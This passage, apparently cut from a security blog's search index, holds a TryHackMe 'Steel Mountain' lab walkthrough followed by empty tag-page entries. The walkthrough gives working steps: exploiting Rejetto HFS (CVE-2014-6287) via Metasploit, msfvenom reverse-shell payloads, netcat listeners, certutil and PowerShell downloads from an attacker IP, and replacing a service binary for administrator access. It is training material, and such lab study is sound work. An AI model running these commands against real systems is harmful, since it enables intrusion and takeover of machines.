machines has 11 ports open, some of which do not have a service identified, but I don‚Äôt need to know those just yet.\nNow I know port 80 and 443 are the standard ports for webservers/websites, but what if those were the only ports I knew about. Well there is one port that seems similar and has a similar service so I could guess, but I could also research non-standard ports.\nInternet Assigned Numbers Authority\nWikipedia: List of TCP and UDP port numbers\nPort Confusion - Is Security Through Obscurity Bad?\nNon-Standard Ports are Under Cyberattack\nAfter some research I now know that the nonstandard webserver port is port 8080. I also know that non-standard ports are a security risk.\nScan the machine with nmap. What is the other port running a web server on?\nAnswer: 8080\nThe next question asks you to look at the other webserver and I can do that by designating which port I want the traffic routed to by putting a colon at the end my IP and typing the port. MACHINE_IP:8080\nAfter navigating to port 8080 I see that the server is running HTTP File Server (HFS) by Rejetto. Clicking on the HFS file version number will take you to the introduction page for HFS.\nTake a look at the other web server. What file server is running?\nAnswer: Rejetto HTTP File Server\nThe next two questions I strung together a little to be able to find the correct CVE number. In searchsploit I searched for HFS 2.3 which returned only a few results, but filtered down to the only Metasploit module since the following question states to use Metasploit.\nOnce my results were filtered down I used the -p flag to find the exploit database link, which then displays the CVE number.\nsearchsploit 34926 -p\nWhat is the CVE number to exploit this file server?\nAnswer: 2014-6287\nThen I launched Metasploit with msfconsole. If you have never interacted with Metasploit before I highly recommend going through a few tutorials or courses to get the feel for the tool.\nN00BLinux - Metasploit Tutorial for Beginners ‚Äì Basics to Advanced Hackersploit has a phenomenal course for just about everything pentest related, but I‚Äôve gone through his Metasploit course and love it. He also teaches most of the eJPT course from eLearnSecurity. I then searched for hfs 2.3 and looked for an exploit with the same name or description as the one we saw on the exploit database. After the search completed and I found a module I selected it with use 1 which is the ID of the exploit. I could have also used use /exploit/windows/http/rejetto_hfs_exec.\nNext I ran show options to see which options I needed to set. The only things that I have to set for this module are RHOSTS and RPORT, which can be set with set RHOSTS TARGET_IP and set RPORT 8080.\nType run or exploit to start the attack.\nNote\rI did switch from a Kali VM to TryHackMe‚Äôs attackbox here due to some network throttling.\nNow that I have a shell I have to figure out where the Meterpreter shell is located by running ls to list out what files are in my current location and then pwd to print the working directory path.\nThe shell is in the C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup folder so to get to the flag I need to move to Bill‚Äôs Desktop by using the cd command. Once I have moved to the Desktop I can cat the flag. I did notice that the windows command of type does not work here which is strange.\nUse Metasploit to get an initial shell. What is the user flag?\nAnswer: cat the contents of ‚Äúuser.txt‚Äù. There are two characters on the front of the flag that you do not need.\nTask3: Privilege Escalation On your machine you will want do download a Powershell script called PowerUp. First you will want to navigate to the Github page provided in THM.\nSelect ‚ÄúRaw‚Äù. Then use this link with our wget command.\nNote\rLearn more about wget here.\ncd into your /opt directory and type wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1. This will download the script to your /opt directory.\nAfter you have the PowerUp script downloaded to your machine go back to your Meterpreter shell to upload the script with upload /opt/PATH TO POWERUP.\nOnce uploaded you can load power shell with load powershell and then powershell_shell. After it is loaded the next thing to do is run the script with . .\\PowerUp.ps1 and then Invoke-AllChecks. If one of these does not work make sure your are in the correct directory with in Meterpreter and that you are putting a space between the two periods when invoking the script.\nTo execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:\nAnswer: No answer needed\nAfter waiting some time you will get a long list of results. The one we are specifically looking for is one where the service can be restarted.\nTake close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?\nAnswer: AdvancedSystemCareService9\nNow that we know the service the next thing to do is to create an msfvenom shell. Back on your desktop open a new terminal and type in msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=1234 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe\nNote\rLearn more about msfvenom:\nMetasploit Unleashed by Offsec Msfvenom Tutorials for Beginners Working with Payload Metasploit in Kali Linux by Geeks for Geeks In a new terminal or clear your existing one we want to start a Netcat listener on the same port as your specified msfvenom shell - port 1234.\nMoving back to your Meterpreter shell use Ctrl+C to exit powershell and cd to ‚ÄúC:\\Program Files (x86)\\IObit\\Advanced SystemCare‚Äù.\nOnce in the Advanced systemCare directory you will want to type shell to get a regular command shell. Then you can stop the AdvancedSystemCareService9 service with sc stop AdvancedSystemCareService9. If you try to upload your shell before stopping the service you will get an error.\nOnce the service is stopped we can upload our shell with the same upload command as before, but make sure you type ^c to get back to a Meterpreter shell first.\nOnce uploaded type shell again and start the service with sc start AdvancedSystemCareService9.\nUpload your binary and replace the legitimate one. Then restart the program to get a shell as root.\nNote: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.\nAnswer: No answer needed\nNow go back to your Netcat listener and you should have a shell.\nFinally cd to your Desktop and type the contents of your root flag.\nWhat is the root flag?\nAnswer: type the contents of the ‚Äúroot.txt‚Äù file located on the Administrators Desktop\nTask 4: Access and Escalation Without Metasploit First, I love that THM goes through rooms with and then with out Metasploit, because some clients and exams don‚Äôt allow for the use of Metasploit. If you get stuck and need a small hint Hacksploit has a great walkthrough.\nWarning\rYou will not be able to use THM built in AttackBox for this section. A Python server is needed on port 80 and it conflicts with AttackBox.\nFirst you will want to use searchsploit or the exploit database to find your exploit code. I used searchsploit Rejetto HTTP File Server 2.3.x and then used the -p flag to view the full exploit path. Once you know where it is you can copy the file to a new location. I used exploit.py on my Desktop.\nOnce downloaded edit the file with your favorite editor (vim, nano, etc) changing the IP and port to your local IP and a free port. I typically use 1234. nano exploit.py\nThen you will want to download the following files to the same location as your exploit.\nPowerShell PowerUp - wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 Netcat - wget https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe WinPeas - wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/a17f91745cafc5fa43a428d766294190c0ff70a1/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe Once those three files are downloaded we need to make a new msfvenom shell with the same IP and port you specified in your exploit.\nmsfvenom -p windows/shell_reverse_tcp LHOST=YOUR IP LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe\nNow to set up a simple Python server on port 80.\npython3 -m http.server 80\nIn a new terminal set up a netcat listener with nc -nlvp 1234\nThen in yet another new terminal (this should be your third) we can start the exploit with python exploit.py ATTACK IP 8080\nYou will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!\nAnswer: No answer needed\nGoing back to our Netcat listener we should have a shell and can cd to C:\\Users\\bill\\Desktop. Once there we can utilize certutil.exe to download WinPeas from your local machine.\ncertutil.exe -urlcache -split -f http://\u003cattacker ip\u003e/winPEAS.exe\nWe can also use PowerShell to do the same.\npowershell -c wget \"http://\u003cattacker ip\u003e:8000/winPEAS.exe\" -outfile \"winPEASx86.exe\"\nNext we can run winPeas with winPeasx86.exe and can see the same vulnerability from before when we used Metasploit.\nWhat powershell -c command could we run to manually find out the service name? Format is ‚Äúpowershell -c ‚Äúcommand here‚Äù\nAnswer: powershell -c ‚ÄúGet-Service‚Äù\nAfter this all you have to do is follow the steps in Task 3 to get root!\nOnce this command runs, you will see you gain a shell as Administrator on our listener!\nAnswer: No answer needed\n",
    "description": "Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilize powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.",
    "tags": [
      "TryHackMe",
      "Metasploit",
      "Powershell",
      "Windows",
      "HFS",
      "Rejetto"
    ],
    "title": "Steel Mountain - TryHackMe",
    "uri": "/walkthroughs/steel-mountain/index.html"
  },
  {
    "breadcrumb": "",
    "content": "Coming Soon Active Directory Enumeration\n",
    "description": "",
    "tags": null,
    "title": "Resources",
    "uri": "/resources/index.html"
  },
  {
    "breadcrumb": "",
    "content": "Contact form:\nSend message\r",
    "description": "",
    "tags": null,
    "title": "Contact",
    "uri": "/contact/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 2023",
    "uri": "/tags/2023/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Active Directory",
    "uri": "/tags/active-directory/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Advent of Cyber",
    "uri": "/tags/advent-of-cyber/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - BootStrap",
    "uri": "/tags/bootstrap/index.html"
  },
  {
    "breadcrumb": "",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Categories",
    "uri": "/categories/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Ctf",
    "uri": "/tags/ctf/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Digital Forensics and Incident Response",
    "uri": "/tags/digital-forensics-and-incident-response/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Enumeration",
    "uri": "/tags/enumeration/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Fundamentals",
    "uri": "/tags/fundamentals/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - HackTheBox",
    "uri": "/tags/hackthebox/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - HFS",
    "uri": "/tags/hfs/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - HTB",
    "uri": "/tags/htb/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - HTTP",
    "uri": "/tags/http/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Linux",
    "uri": "/tags/linux/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Machine Learning",
    "uri": "/tags/machine-learning/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Malware Analysis",
    "uri": "/tags/malware-analysis/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Metasploit",
    "uri": "/tags/metasploit/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Penetration Testing",
    "uri": "/tags/penetration-testing/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Powershell",
    "uri": "/tags/powershell/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - PowerView",
    "uri": "/tags/powerview/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Proftpd",
    "uri": "/tags/proftpd/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - RCE",
    "uri": "/tags/rce/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Red Team",
    "uri": "/tags/red-team/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Rejetto",
    "uri": "/tags/rejetto/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Samba",
    "uri": "/tags/samba/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Security Operations and Engineering",
    "uri": "/tags/security-operations-and-engineering/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - SessionHijacking",
    "uri": "/tags/sessionhijacking/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - SpringBoot",
    "uri": "/tags/springboot/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - SSH",
    "uri": "/tags/ssh/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - SUID Binary",
    "uri": "/tags/suid-binary/index.html"
  },
  {
    "breadcrumb": "",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tags",
    "uri": "/tags/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - TryHackMe",
    "uri": "/tags/tryhackme/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Web Application",
    "uri": "/tags/web-application/index.html"
  },
  {
    "breadcrumb": "Tags",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - Windows",
    "uri": "/tags/windows/index.html"
  }
]
